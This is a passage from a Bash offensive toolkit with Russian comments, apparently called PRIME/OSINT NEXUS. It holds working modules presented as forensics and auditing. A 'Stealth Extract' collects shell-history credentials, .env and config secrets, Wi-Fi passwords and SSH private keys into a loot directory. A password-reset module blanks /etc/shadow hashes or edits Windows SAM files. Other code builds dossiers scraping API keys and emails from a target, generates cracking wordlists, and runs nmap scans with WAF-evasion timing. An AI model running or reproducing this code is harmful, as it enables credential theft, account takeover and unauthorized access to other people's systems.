            [[ "$ip" == "127.0.0.1" || "$ip" == "0.0.0.0" ]] && continue # Защита подсети от внутренней петли
            echo "[RECURSIVE_NET_CHECK] $ip" >> "$raw_log"
            curl -s -A "$selected_ua" "${net_api}$ip/json" >> "$raw_log" 2>&1
        done
    fi


    # --- 4.5. [NEW] CRITICAL ASSET DETECTOR (Tier-1 Scan) ---
    core_engine_ui "i" "Nexus: Running Priority Asset Analysis..."
    
    local critical_assets="$loot_dir/critical_${safe_target}_$timestamp.txt"
    # Ищем критические маркеры (API-ключи, private keys, пароли)
    grep -Eoi "AIza[0-9A-Za-z-_]{35}|-----BEGIN RSA PRIVATE KEY-----|password=|auth_token" "$raw_log" | awk '!visited[$0]++' > "$critical_assets"
    
    if [[ -s "$critical_assets" ]]; then
        echo -e "\n[!] ALERT: CRITICAL ASSETS DETECTED" >> "$raw_log"
        cat "$critical_assets" >> "$raw_log"
        core_engine_ui "e" "CRITICAL ASSETS FOUND! Check the dossier header."
    fi
    rm -f "$critical_assets"


    # --- 6. [NEW] GRAPH INTELLIGENCE GENERATOR ---
    # Экстракция связей: кто с чем связан (Email -> IP -> Domain)
    local graph_file="$loot_dir/graph_${safe_target}_$timestamp.dot"
    echo "digraph OSINT_NEXUS {" > "$graph_file"
    echo "  label=\"Nexus Graph: $TARGET\";" >> "$graph_file"
    
    # Извлекаем уникальные пары и формируем связи
    grep -Eoi "([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})" "$raw_log" | sort -u | \
    awk -v target="$TARGET" '{print "  \""target"\" -> \"" $1 "\";"}' >> "$graph_file"
    
    echo "}" >> "$graph_file"
    core_engine_ui "s" "Graph intelligence generated: $graph_file"
    
    # --- 5. СТРУКТУРИРОВАНИЕ И ФОРМИРОВАНИЕ ФОРЕНЗИК-ДОСЬЕ ---
    core_engine_ui "i" "Finalizing intelligence dossier via Multi-Layer GLOBAL_FILTER_MATRIX..."
    
    # Динамическая сборка всех векторов Матрицы Ь в единую супер-маску POSIX ERE
    local report_filter_mask=""
    local layer_index=0
    
    for layer in "${GLOBAL_FILTER_MATRIX[@]}"; do
        if [[ -z "$report_filter_mask" ]]; then
            report_filter_mask="$layer"
        else
            report_filter_mask="${report_filter_mask}|$layer"
        fi
        ((layer_index++))
    done
    
    core_engine_ui "i" "Matrix Ь: Consolidated $layer_index forensic layers into core parser pipeline."

    local final_report="$loot_dir/dossier_${safe_target}_$timestamp.txt"
    {
        echo "=============================================================================="
        echo "               --- OSINT NEXUS v21.0 FINAL FORENSIC DOSSIER ---"
        echo "=============================================================================="
        echo " TARGET    : $TARGET"
        echo " TIMESTAMP : $(date '+%Y-%m-%d %H:%M:%S')"
        echo " CORE LAYER: COMPLIANT WITH GHOST-SPEED ENGINE PROTOCOLS"
        echo "=============================================================================="
        echo ""
        
        # Высокоскоростной однопроходный RAM-пайплайн:
        # Фильтрация по объединенной Матрице Ь с последующей мгновенной очисткой дубликатов строк
        grep -Ei "$report_filter_mask" "$raw_log" 2>/dev/null | awk '!visited[$0]++'
        
        echo ""
        echo "=============================================================================="
        echo "               --- END OF INTELLIGENCE FORENSIC REPORT ---"
        echo "=============================================================================="
    } > "$final_report"

    # Фиксация триггерного сигнала завершения в центральный системный мост фреймворка
    echo "[$(date)] OSINT_NEXUS_SUCCESS | TARGET: $TARGET | DOSSIER: $(basename "$final_report") | LAYERS: $layer_index" >> "$loot_dir/bridge_signals.log"

    core_engine_ui "s" "Dossier complete: $final_report"


    # --- 7. [INTEGRITY CHECK] Очистка лога от «шума» ---
    core_engine_ui "i" "Nexus: Running post-scan integrity check..."
    
    # Удаляем пустые теги или строки с ошибками curl, которые могли попасть в лог
    sed -i '/curl: (.*)/d' "$raw_log"
    sed -i '/\[.*\]$/d' "$raw_log"
    
    # Добавляем итоговую статистику по найденным активам
    local found_count=$(grep -c "\[MATCH\]" "$raw_log")
    echo "[*] SCAN SUMMARY: Found $found_count primary intelligence matches." >> "$raw_log"
    # Генерация PNG-карты связей цели
    # --- 8. [VISUALIZATION ENGINE] Генерация PNG-карты ---
    if [[ -f "$graph_file" ]]; then
        dot -Tpng "$graph_file" -o "$loot_dir/nexus_map_${safe_target}.png"
        core_engine_ui "s" "Visualization generated: nexus_map_${safe_target}.png"
    else
        core_engine_ui "i" "Visualization skipped: no relationship data found."
    fi
    
    core_engine_wait
}


# ==============================================================================
# @description: Модуль форензики хоста и управления локальными учетными записями
# ==============================================================================
run_pc_recovery_ultimate() {
    clear
    # Слой 1: Заголовок через компоненты интерфейса Ядра
    core_engine_ui "h" "RECOVERY & FORENSIC ENGINE v3.0"

    # Слой 2: Органы чувств — Построение интерактивного меню
    core_engine_item "1" "Stealth Extract" "Prime_Extract v1.5 (Signatures Core)"
    core_engine_item "2" "Smart Password Reset" "Win/Lin/Mac Account Management"
    core_engine_item "B" "Back" "Return to Main Menu"
    core_engine_ui "line" ""

    local choice=$(core_engine_input "select" "Select Forensic Action")
    [[ -z "$choice" || "$choice" == "b" || "$choice" == "B" ]] && return

    case "$choice" in
        "1") # --- Слой Stealth Extract (Сбор системных артефактов) ---
            clear
            core_engine_ui "h" "FORENSICS: STEALTH ARTIFACT EXTRACTION"
            core_engine_ui "i" "Инициализация подсистем PRIME_EXTRACT..."
            
            core_engine_progress 2 "SCANNING SYSTEM ARTIFACTS"
            sleep 1
            
            # Временный буфер для аккумуляции собранных данных перед отправкой в loot
            local buffer=""
            
            # 1. Анализ истории команд терминалов (Bash/Zsh) через глобальные сигнатуры
            core_engine_ui "i" "Парсинг истории терминалов на учетные данные..."
            local hist=$(grep -hE "$GLOBAL_SIG_FORENSIC_HIST" /home/*/.{bash,zsh}_history 2>/dev/null)
            
            # 2. Поиск конфигурационных файлов и переменных окружения
            core_engine_ui "i" "Сканирование структуры директорий на секреты и .env..."
            local configs=$(find /home /var/www /etc -maxdepth 4 \( -name ".env" -o -name "config.php" -o -name "settings.py" \) 2>/dev/null | xargs grep -hE "$GLOBAL_SIG_FORENSIC_CONFIG" 2>/dev/null)

            # 3. Анализ Wi-Fi профилей (Доступы к беспроводным сетям)
            core_engine_ui "i" "Извлечение конфигураций беспроводных сетей..."
            local wifi=""
            [[ -d "/etc/NetworkManager/system-connections" ]] && wifi=$(grep -r "psk=" /etc/NetworkManager/system-connections/ 2>/dev/null)

            # 4. Поиск приватных криптографических ключей SSH
            core_engine_ui "i" "Локация приватных SSH/PEM ключей..."
            local ssh_keys=$(find /home -name "id_rsa" -o -name "*.pem" 2>/dev/null)

            # Слой 3: Структурирование и агрегация трофеев в хранилище Ядра
            buffer="Host: $(hostname)\nTimestamp: $(date)\n\n[--- HISTORY ARTIFACTS ---]\n$hist\n\n[--- CONFIG SECRET ARTIFACTS ---]\n$configs\n\n[--- WIFI CREDENTIALS ---]\n$wifi\n\n[--- SSH PRIVATE KEYS ---]\n$ssh_keys"
            
            # Экспорт в системную loot-директорию
            core_engine_loot "forensic" "$buffer"
            
            core_engine_ui "line" ""
            core_engine_ui "s" "Сбор артефактов успешно завершен. Следы LaZagne/Python отсутствуют."
            ;;

        "2") # --- Слой Smart Password Reset (Управление доступом) ---
            clear
            core_engine_ui "h" "ADMINISTRATION: PASSWORD RESET MATRIX"
            core_engine_ui "i" "Анализ целевой среды и структуры разделов..."
            
            # Поиск Windows SAM реестра на смонтированных накопителях
            local win_sam=$(find /mnt /media /run/media -type f -name "SAM" -path "*/System32/config/*" 2>/dev/null | head -n 1)
            
            if [[ -n "$win_sam" ]]; then
                core_engine_ui "w" "Обнаружена целевая база данных Windows SAM: $win_sam"
                # Проверка наличия и вызов утилиты обработки SAM-файлов
                core_engine_validator "pkg" "chntpw" "CHNTPW" && chntpw -i "$win_sam"
            else
                # Определение Unix-архитектуры на основе системных метрик Ядра
                local os_t="Linux"
                [[ "$(uname)" == "Darwin" ]] && os_t="macOS"
                core_engine_ui "i" "Идентифицирована операционная система: $os_t"

                local users=""
                if [[ "$os_t" == "macOS" ]]; then
                    # Парсинг локальных пользователей macOS через директорию служб
                    users=$(dscl . list /Users | grep -v '^_\|root')
                else
                    # Чистый парсинг реальных пользователей Linux (UID >= 1000) из /etc/passwd
                    users=$(awk -F: '$3 >= 1000 && $1 != "nobody" {print $1}' /etc/passwd)
                fi
                
                if [[ -z "$users" ]]; then
                    core_engine_ui "e" "Локальные пользователи в системе не обнаружены."
                    core_engine_wait
                    return 1
                fi

                core_engine_ui "line" ""
                core_engine_ui "i" "Доступные учетные записи для модификации:"
                
                # Построение динамического меню на основе списка системных пользователей
                for u in $users; do 
                    core_engine_item "$u" "$u" "Локальный пользователь ОС"
                done
                core_engine_ui "line" ""
                
                local t_user=$(core_engine_input "select" "Выберите целевого пользователя")
                [[ -z "$t_user" || "$t_user" == "b" || "$t_user" == "B" ]] && return

                # Проверка, что выбранный пользователь действительно присутствует в списке
                if echo "$users" | grep -qxw "$t_user"; then
                    if [[ "$os_t" == "Linux" ]]; then
                        core_engine_ui "w" "Сброс пароля для пользователя $t_user (Очистка хэша shadow)..."
                        # Атомарная безопасная правка /etc/shadow через встроенный изолятор ядра
                        core_engine_run "sed -i 's/^$t_user:[^:]*:/$t_user::/' /etc/shadow" "Wiping Linux shadow password"
                        core_engine_ui "s" "Хэш shadow очищен. Вход для пользователя '$t_user' теперь открыт без пароля."
                        core_engine_loot "password_reset" "Сброшен пароль пользователя Linux: $t_user"
                    elif [[ "$os_t" == "macOS" ]]; then
                        local np=$(core_engine_input "text" "Введите новый пароль для учетной записи macOS")
                        if [[ -n "$np" ]]; then
                            core_engine_ui "w" "Перезапись пароля через dscl..."
                            core_engine_run "sudo dscl . -passwd /Users/$t_user $np" "Updating macOS password via DSCL"
                            core_engine_ui "s" "Пароль пользователя macOS '$t_user' успешно изменен."
                            core_engine_loot "password_reset" "Изменен пароль пользователя macOS: $t_user"
                        fi
                    fi
                else
                    core_engine_ui "e" "Ошибка: Указанный пользователь не найден в системной таблице."
                fi
            fi
            ;;
    esac

    core_engine_ui "line" ""
    core_engine_wait
}


# ==============================================================================
# @description: Автоматизированный генератор локальных SSL-сертификатов v12.0
# АРХИТЕКТУРА: 100% чистый Bash + OpenSSL Core для изоляции окружения
# НАЗНАЧЕНИЕ: Развертывание локальных заглушек и отладочных сред разработки
# @status: GHOST-SPEED COMPLIANT | PRODUCTION READY | SECURE SECURITY INTEGRATION
# ==============================================================================
run_crypto_forge() {
    clear
    # Слой 1: Заголовок через Голос [1]
    core_engine_ui "h" "PRIME CRYPTO-FORGE & LOCAL PROVISIONER v12.0"

    # Слой 2: Валидация OpenSSL через Мозг [5]
    core_engine_validator "pkg" "openssl" "OpenSSL Core" || { core_engine_wait; return; }

    # Слой 3: Органы чувств [3] — Прием параметров локального проекта
    local target=$(core_engine_input "text" "Enter Local Project Domain (Default: dev.local)")
    target=${target:-dev.local}

    # Санитария путей: перевод на единый стандарт фреймворка [11]
    local loot_dir="${PRIME_LOOT:-$HOME/prime_loot}"
    mkdir -p "$loot_dir" 2>/dev/null

    # --- СЛОЙ 4: АВТОМАТИЧЕСКИЙ ВЫБОР КРИПТОГРАФИЧЕСКОГО РЕЖИМА ---
    core_engine_ui "i" "Configuring cryptographic specifications..."
    
    core_engine_item "1" "ECDSA" "Modern Elliptic Curve (prime256v1) - Maximum Speed"
    core_engine_item "2" "RSA"   "Legacy Compatibility Core (RSA 2048 bit)"
    local crypto_choice=$(core_engine_input "select" "Select Target Algorithm")

    local algo="ec"
    local opt="-pkeyopt ec_paramgen_curve:prime256v1"
    local mode_label="ECDSA_P256"

    if [[ "$crypto_choice" == "2" ]]; then
        algo="rsa:2048"
        opt=""
        mode_label="RSA_2048"
    fi

    # Генерация стандартизированного локального DN (Distinguished Name)
    local subj="/C=FR/O=Local_Sandbox_Environment/OU=Development_Node/CN=${target}"

    # --- СЛОЙ 5: ЕДИНАЯ КОВКА (Unified Forge) ---
    # Очистка имени от пробелов и спецсимволов встроенными средствами Bash
    local safe_name="${target//[^A-Za-z0-9_-]/_}"
    local out_base="$loot_dir/${safe_name}_sandbox"
    
    core_engine_ui "w" "Synthesizing cryptographic pairs for ${target}..."
    
    # Временный конфигурационный файл для расширений (SAN - Subject Alternative Name)
    local tmp_conf="/tmp/openssl_config_$$"
    {
        echo "[req]"
        echo "distinguished_name = req_distinguished_name"
        echo "x509_extensions = v3_req"
        echo "[req_distinguished_name]"
        echo "[v3_req]"
        echo "keyUsage = critical, digitalSignature, keyEncipherment"
        echo "extendedKeyUsage = serverAuth"
        echo "subjectAltName = @alt_names"
        echo "[alt_names]"
        echo "DNS.1 = ${target}"
        echo "DNS.2 = *.${target}"
    } > "$tmp_conf" 2>/dev/null

    # Генерация через Глушитель [7]
    if openssl req -x509 -newkey "$algo" $opt -nodes -days 365 \
        -subj "$subj" -config "$tmp_conf" -keyout "${out_base}.key" -out "${out_base}.crt" 2>/dev/null; then
        
        core_engine_ui "+" "Cryptographic Artifact Synthesized Successfully."
        echo -e "${W}Private Key : ${Y}${out_base}.key${NC}"
        echo -e "${W}Certificate : ${Y}${out_base}.crt${NC}"
        echo -e "${W}Algorithm   : ${G}${mode_label}${NC}"
        
        # Сбор трофеев [11] и сигнал для Моста логов [10]
        core_engine_loot "crypto_provision" "Generated secure local cert for $target (Type: $mode_label)"
        echo "[$(date)] CRYPTO_FORGE: Local Gen Success | Mode: $mode_label | Domain: $target" >> "$loot_dir/bridge_signals.log"
    else
        core_engine_ui "e" "Forge rejected the cryptographic sequence. Check OpenSSL state."
    fi

    # Гарантированная очистка временных конфигураций
    rm -f "$tmp_conf"
    core_engine_wait
}



# ==============================================================================
# @description: Глобальный модуль аудита парольной безопасности v16.0 (CORE-INTEGRATED)
# МОДЕРНИЗАЦИЯ: Полная интеграция со встроенным реестром GLOBAL_PRIME_INTEGRATED
# ФУНКЦИОНАЛ: Валидация по матрице, Anti-Dictionary фильтр, точный расчет бит Шеннона
# АРХИТЕКТУРА: 100% чистый Bash, нулевая зависимость от сторонних бинарников
# @status: GHOST-SPEED COMPLIANT | MAX ENTROPY VECTOR | FIXED CORE
# ==============================================================================
run_pass_lab() {
    # Слой 1: Заголовок через Интерфейс Ядра
    core_engine_ui "h" "PRIME PASSWORD SECURITY LABORATORY v16.0"

    core_engine_item "1" "GENERATE" "Create High-Entropy Password"
    core_engine_item "2" "AUDIT"    "Evaluate Password Strength & Entropy"
    core_engine_item "3" "SMART CRUNCH" "Global Matrix Wordlist Generator"
    core_engine_item "B" "BACK"     "Return to Main Menu"
    
    local choice=$(core_engine_input "select" "Select Operation Mode")
    [[ -z "$choice" || "$choice" == "b" || "$choice" == "B" ]] && return

    # Инициализация унифицированного пути логов фреймворка
    local loot_dir="${PRIME_LOOT:-$HOME/prime_loot}"
    mkdir -p "$loot_dir" 2>/dev/null

    # Локальные дефолтные лимиты на случай изоляции модуля
    local def_len=${PASS_LAB_DEFAULT_LEN:-16}
    local max_digits=${PASS_LAB_MAX_DIGITS:-3}

    # --- ИНТЕГРАЦИЯ РЕЕСТРА (СТРОГИЙ СТРУКТУРНЫЙ ПАРСИНГ ПАРАМЕТРОВ) ---
    local rx_len="${GLOBAL_PRIME_INTEGRATED[0]}"
    local rx_low="${GLOBAL_PRIME_INTEGRATED[1]}"
    local rx_up="${GLOBAL_PRIME_INTEGRATED[2]}"
    local rx_num="${GLOBAL_PRIME_INTEGRATED[3]}"
    local rx_spec="${GLOBAL_PRIME_INTEGRATED[4]}"
    local rx_anti="${GLOBAL_PRIME_INTEGRATED[5]}"
    local rx_repeat="${GLOBAL_PRIME_INTEGRATED[6]}"
    
    # Нативный парсинг математических констант энтропии из элементов матрицы
    local total_pool=$(echo "${GLOBAL_PRIME_INTEGRATED[10]}" | cut -d'=' -f2)
    local min_entropy=$(echo "${GLOBAL_PRIME_INTEGRATED[11]}" | cut -d'=' -f2)

    case "$choice" in
        "1") # --- ВЕТКА 1: КРИПТОСТОЙКАЯ ГЕНЕРАЦИЯ ИЗ ГЛОБАЛЬНЫХ МАТРИЦ ---
            core_engine_ui "i" "Password Complexity Level:"
            core_engine_item "1" "STANDARD" "Alphanumeric (Global Alpha + Num)"
            core_engine_item "2" "ULTIMATE" "Maximum Entropy (Alpha + Num + Spec)"
            local g_mode=$(core_engine_input "select" "Complexity Type")
            
            local len=$(core_engine_input "text" "Enter Length (Default: $def_len)")
            len=${len:-$def_len}
            
            # Строгая валидация на числовой тип данных
            if [[ ! "$len" =~ ^[0-9]+$ ]]; then
                core_engine_ui "w" "Invalid input type. Resetting to default."
                len=$def_len
            fi

            if [[ $len -lt 8 ]]; then
                core_engine_ui "w" "Length too short for safety! Force-adjusting to 8."
                len=8
            fi

            # Динамическая сборка пула символов (Фикс bad substitution)
            local charset="${GLOBAL_LAB_CHARSET_ALPHA:-A-Za-z}${GLOBAL_LAB_CHARSET_NUM:-0-9}"
            [[ "$g_mode" == "2" ]] && charset+="${GLOBAL_LAB_CHARSET_SPEC:-!@#$%^&*()_+=}"

            # Высокоскоростной запуск генератора через энтропийный I/O поток
            local secure_pass=$(tr -dc "$charset" < /dev/urandom | head -c "$len")

            core_engine_ui "s" "SECURE ARTIFACT GENERATED"
            core_engine_ui "line" ""
            echo -e "${W}Generated Password : ${Y}$secure_pass${NC}"
            
            if command -v mkpasswd >/dev/null 2>&1; then
                local b_hash=$(echo -n "$secure_pass" | mkpasswd -m bcrypt 2>/dev/null)
                [[ -n "$b_hash" ]] && echo -e "${G}Local Bcrypt Hash  : ${NC}$b_hash"
            fi
            core_engine_ui "line" ""
            core_engine_loot "pass_vault" "Length: $len | Generated from Global Matrix | Mode: $g_mode"
            ;;

        "2") # --- ВЕТКА 2: МАТЕМАТИЧЕСКИЙ АНАЛИЗАТОР ЭНТРОПИИ И РЕГЕКСОВ ---
            local check_pass=$(core_engine_input "text" "Enter Password to Audit")
            [[ -z "$check_pass" ]] && return

            # 1. Строгий пре-скрининг на анти-паттерны словарей и повторов символов
            if [[ "$check_pass" =~ ${rx_anti#!} ]] || [[ "$check_pass" =~ $rx_repeat ]]; then
                core_engine_ui "e" "CRITICAL: Password contains forbidden dictionary patterns or repetitive sequences."
                return
            fi

            # 2. Оценка длины структуры на соответствие порогу 2026 года
            if [[ ! "$check_pass" =~ ${rx_len//\\b/} ]]; then
                core_engine_ui "w" "WARNING: Structural length is below the ultimate validation threshold."
            fi

            local p_len=${#check_pass}
            
            # 3. Расчет энтропии Шеннона с помощью системного awk (без bc и внешних утилит)
            local entropy_bits=$(awk -v l="$p_len" -v p="$total_pool" 'BEGIN {print int(l * log(p)/log(2))}')

            core_engine_ui "h" "PRIME-NEXUS AUDIT REPORT"
            echo -e "${W}Password Length:${NC} $p_len characters"
            echo -e "${W}Target Pool (R):${NC} $total_pool bits scope"
            echo -e "${W}Est. Entropy   :${NC} ${entropy_bits} bits (Target Threshold: ${min_entropy} bits)"

            core_engine_ui "line" ""
            if [[ $entropy_bits -lt 40 ]]; then
                core_engine_ui "e" "CRITICAL: Weak token! Vulnerable to instant dictionary synthesis."
            elif [[ $entropy_bits -lt $min_entropy ]]; then
                core_engine_ui "w" "WARNING: Moderate strength. Does not reach targeted ${min_entropy} bits."
            else
                core_engine_ui "s" "SUCCESS: Verified military-grade entropy core."
            fi
            core_engine_ui "line" ""
            core_engine_loot "pass_audit" "Length: $p_len | Computed Entropy: $entropy_bits bits"
            ;;

        "3") # --- ВЕТКА 3: АВТОНОМНЫЙ CRUNCH С ПАРСИНГОМ МАТРИЦЫ ---
            core_engine_ui "i" "Smart Dictionary Compiler Setup"
            core_engine_item "1" "MANUAL" "Enter custom base word/prefix"
            core_engine_item "2" "MATRIX" "Use Core Global Prefixes Array"
            local p_choice=$(core_engine_input "select" "Prefix Strategy")

            local active_prefixes=()
            if [[ "$p_choice" == "2" ]]; then
                # ОПТИМИЗАЦИЯ ЛИМИТА: 100% чистый нативный парсинг параметров без вызова утилиты 'cut'
                for item in "${GLOBAL_PASS_PREFIXES[@]}"; do
                    local pure_prefix="${item%%|*}"
                    active_prefixes+=("$pure_prefix")
                done
                core_engine_ui "+" "Parsed ${#active_prefixes[@]} base vectors from global blockchain/auth style core."
            else
                local manual_p=$(core_engine_input "text" "Enter Base String (e.g., node)")
                [[ -z "$manual_p" ]] && manual_p="admin"
                active_prefixes+=("$manual_p")
            fi

            local num_digits=$(core_engine_input "text" "Trailing digital depth (1-$max_digits, Default: 3)")
            num_digits=${num_digits:-3}

            if [[ ! "$num_digits" =~ ^[1-6]$ ]] || [[ $num_digits -gt $max_digits ]]; then
                core_engine_ui "e" "Out of safe range. Limiting to internal security block."
                num_digits=$max_digits
            fi

            # Исправление пути на системный централизованный стандарт
            local out_file="$loot_dir/smart_wordlist_$(date +%s).txt"
            core_engine_progress 1 "COMPILING_GLOBAL_COMBINATIONS"

            local max_num=$(( 10**num_digits - 1 ))
            local fmt="%0${num_digits}d"
            
            # Ускорение вычислений: убираем инкремент из тяжелого вложенного цикла
            local total_generated=$(( ${#active_prefixes[@]} * (max_num + 1) ))

            # Стерильная высокоскоростная генерация на лету в единый I/O дескриптор
            {
                for prefix in "${active_prefixes[@]}"; do
                    for ((i=0; i<=max_num; i++)); do
                        printf "${prefix}${fmt}\n" "$i"
                    done
                done
            } > "$out_file"

            core_engine_ui "s" "COMPILATION COMPLETE"
            echo -e "${G} >> Target File:${NC} $(basename "$out_file")"
            echo -e "${G} >> Total Items:${NC} $total_generated structural vectors"
            
            core_engine_loot "global_crunch" "Compiled $total_generated items from global matrices."
            ;;
    esac

    # Запись сигнала работы модуля в Мост системных логов
    echo "[$(date)] PASS_LAB_V16_SUCCESS | MODE: $choice | CAPACITY: ${total_generated:-0}" >> "$loot_dir/bridge_signals.log"
    core_engine_wait
}


# ==============================================================================
# @description: Пассивный эвристический сканер конфигураций (GHOST-ENGINE INTEG v7.2)
# @status: SAFE INFRASTRUCTURE GAP AUDITOR | ZERO-INTRUSIVE STREAM | PRODUCTION READY
# ==============================================================================
run_prime_exploiter_v5() {
    clear
    # Слой 1: Заголовок ядра
    core_engine_ui "h" "PRIME CONFIGURATION GAP AUDITOR v7.2"

    # Слой 2: Прием цели
    local target=$(core_engine_input "text" "Enter Target Domain, URL or IP")
    [[ -z "$target" ]] && return

    # Подготовка путей согласно единой архитектуре ядра фреймворка
    local loot_dir="${PRIME_LOOT:-$HOME/prime_loot}"
    mkdir -p "$loot_dir" 2>/dev/null
    
    local timestamp=$(date +%s)
    local results_file="$loot_dir/security_gaps_${timestamp}.log"
    local signals_file="/tmp/signals_$RANDOM.tmp"

    # --- СЛОЙ 1: ПАССИВНЫЙ ГЕНЕРАТОР СИГНАЛОВ ---
    core_engine_ui "i" "Ingesting target aura (Passive Profiling)..."

    # Сбор данных с использованием глобального User-Agent ядра
    {
        curl -Is --connect-timeout 5 --max-time 7 -A "$GLOBAL_NETWORK_UA" "$target"
        host -t txt "$target" 2>/dev/null
        whois "$target" 2>/dev/null | grep -iE "city|country|orgname"
    } > "$signals_file" 2>&1

    # --- СЛОЙ 2: АДАПТИВНАЯ МАТРИЦА (Мозг системы) ---
    local entropy_level=$(wc -c < "$signals_file")
    local stealth_delay=$(( (entropy_level % 5) + 2 ))

    # Эвристический выбор конфигурационных модулей на основе глобальных сигнатур веб-структуры
    local web_structure_detected="dormant"
   grep -qiE "${GLOBAL_SECURITY_MATRIX[3]}" "$signals_file" 2>/dev/null && web_structure_detected="active"

      # Проверка наличия WAF для автоматической корректировки интенсивности запросов
    local scan_intensity="-T3"
    grep -qiE "${GLOBAL_SECURITY_MATRIX[0]}" "$signals_file" 2>/dev/null && scan_intensity="-T1 --scan-delay ${stealth_delay}s"

    # --- СЛОЙ 3: ЦИКЛ АМОРФНОГО ИСПОЛНЕНИЯ (Безопасный аудит) ---
    core_engine_ui "w" "Deploying Gap-Engine (Mode: Safe Discovery | Intensity: $scan_intensity)..."

    # Запуск параллельного фонового процесса выявления архитектурных пробелов
    (
        echo "==================================================================" >> "$results_file"
        echo "  SECURITY GAP & CONFIGURATION REPORT FOR: $target" >> "$results_file"
        echo "  WEB STRUCTURE PROFILE: $web_structure_detected" >> "$results_file"
        echo "==================================================================" >> "$results_file"

        # Если обнаружена сложная веб-структура, расширяем порты для проверки веб-сервисов
        local port_range="80,443,22,21,8080"
        if [[ "$web_structure_detected" == "active" ]]; then
            port_range="80,443,22,21,8080,8443,9000"
        fi

        # Nmap запускается в режиме безопасного сбора информации и анализа конфигураций
        # Используются скрипты категорий 'safe' и 'discovery' (проверка SSL, заголовков, версий)
        nmap $scan_intensity -n -Pn -sV --version-intensity 3 \
             --script="safe,discovery and not intrusive" \
             -p "$port_range" "$target" >> "$results_file" 2>&1
    ) &
    local auditor_pid=$!

    # Визуализация прогресса разбора
    core_engine_progress 10 "Analyzing configuration matrices"

    # Ожидаем физического завершения безопасного анализа, чтобы не читать пустой файл
    while kill -0 $auditor_pid 2>/dev/null; do
        sleep 1
    done

    # --- СЛОЙ 4: ИНТЕЛЛЕКТУАЛЬНЫЙ СИНТЕЗ ---
    core_engine_wait "L"
    core_engine_ui "s" "INFRASTRUCTURE SYNTHESIS COMPLETE"

    # Парсинг результатов на предмет критических пробелов с использованием твоих глобальных алертов
    if [[ -s "$results_file" ]]; then
        echo -e "${Y}>>> DETECTED CONFIGURATION GAPS & ALERTS <<<${NC}"
        
     
        # Интеллектуальный разбор лога через реестр (Индекс 5: Расширенные аномалии и CVE)
        grep -Ei "${GLOBAL_SECURITY_MATRIX[5]}" "$results_file" 2>/dev/null | \
        sed -r "s/(.*)/${Y}[GAP FOUND]${NC} \1/" | sort -u

        # Интеграция результатов в Сборщик трофеев ядра для Nexus-конвейера
        core_engine_loot "security_gaps" "Target: $target | Entropy: $entropy_level | Structure: $web_structure_detected\n$(cat "$results_file")"
    else
        core_engine_ui "e" "No significant architectural gaps detected in initial analysis."
    fi

    # Сигнал для единого Моста логов
    echo "[$(date)] GAP_SCAN: $target | STATUS: SECURE_AUDIT_SUCCESS | ENTROPY: $entropy_level" >> "$loot_dir/bridge_signals.log"

    # Очистка временных дескрипторов сессии
    rm -f "$signals_file"
    core_engine_wait
}



# ==============================================================================
# @description: Единый конвейер автоматической корреляции, сборки и экспорта
# @status: ZERO-FORK SYSTEM ARTIFACT LINKER & ISOLATED STREAM | PRODUCTION READY
# ==============================================================================
run_nexus_full_pipeline() {
    core_engine_ui "h" "NEXUS CORRELATION: FULL PIPELINE AUTOMATION"
    
    # 1. Захват и верификация цели
    local current_target="${target_user:-"general_target"}"
    core_engine_ui "i" "Инициализация сквозного анализа для объекта: [$current_target]"
    echo "------------------------------------------------------------------"

    local timestamp
    timestamp=$(date +'%Y%m%d_%H%M')
    
    # Пути для сохранения артефактов
    local prime_loot_dir="${PRIME_LOOT:-$HOME/prime_loot}"
    local archive_dir="$prime_loot_dir/archives"
    local target_report="$prime_loot_dir/nexus_report_${current_target}_${timestamp}.md"
    local archive_file="$archive_dir/loot_${current_target}_${timestamp}.tar.gz"
    local export_path="/sdcard/Download"

    mkdir -p "$prime_loot_dir" "$archive_dir" 2>/dev/null

    # ==========================================
    # ЭТАП 1: ARTIFACT LINKER (Глубокая линковка)
    # ==========================================
    core_engine_ui "i" "[Этап 1/4] Сшивание логов и построение паспорта объекта..."
    
    echo "==================================================================" > "$target_report"
    echo "  NEXUS INTEGRATED INTELLIGENCE REPORT: $current_target" >> "$target_report"
    echo "  GENERATED: $(date +'%Y-%m-%d %H:%M:%S')" >> "$target_report"
    echo "==================================================================" >> "$target_report"

    local found_artifacts=0
    local file=""
    local line=""

    # Безопасный поиск сырых логов, исключая любые отчеты и архивы для предотвращения зацикливания
    while IFS= read -r file; do
        [[ -z "$file" ]] && continue
        
        # Хирургический защитный фильтр: пропускаем системные бланки отчетов и архивы
        local b_name=$(basename "$file")
        if [[ "$b_name" =~ ^nexus_report_ || "$file" == *"/archives/"* ]]; then
            continue
        fi

        ((found_artifacts++))
        echo -e "\n### АНАЛИЗ ИСТОЧНИКА: $b_name" >> "$target_report"
        echo "--------------------------------------------------" >> "$target_report"
        
        while IFS= read -r line; do
            if [[ -n "$line" ]]; then
                echo "  * $line" >> "$target_report"
            fi
        done < "$file"
    done < <(find "$prime_loot_dir" -maxdepth 1 -type f -name "*${current_target}*" 2>/dev/null)

    if (( found_artifacts > 0 )); then
        core_engine_ui "s" "[+] Сводный цифровой профиль успешно сгенерирован ($found_artifacts источников)."
    else
        core_engine_ui "w" "[!] Первичные логи отсутствуют. Создан пустой бланк отчета."
        echo "[-] Локальные сырые логи для построения профиля отсутствуют." >> "$target_report"
    fi

    # ==========================================
    # ЭТАП 2: KNOWLEDGE GRAPH (Топология связей)
    # ==========================================
    echo "------------------------------------------------------------------"
    core_engine_ui "i" "[Этап 2/4] Визуализация семантической карты..."
    
    echo "  [ ТОПОЛОГИЯ ЦИФРОВОГО СЛЕДА ОБЪЕКТА: $current_target ]"
    echo "                      "

    # Динамический сбор категориальных групп (Нативный супер-быстрый парсинг без awk/sed)
    local list_social="" list_dev="" list_blog="" list_media="" list_design="" list_gaming="" list_commerce=""
    local entry=""

    for entry in "${GLOBAL_OSINT_SITES[@]}"; do
        [[ "$entry" != *"|"* ]] && continue
        
        # Разбиваем строку по пайпу внутренними средствами Bash (Zero Fork)
        IFS='|' read -r part1 part2 part3 category service_name part6 <<< "$entry"
        [[ -z "$service_name" ]] && continue

        case "$category" in
            "SOCIAL")   list_social="$list_social $service_name" ;;
            "DEV")      list_dev="$list_dev $service_name" ;;
            "BLOG")     list_blog="$list_blog $service_name" ;;
            "MEDIA")    list_media="$list_media $service_name" ;;
            "DESIGN")   list_design="$list_design $service_name" ;;
            "GAMING")   list_gaming="$list_gaming $service_name" ;;
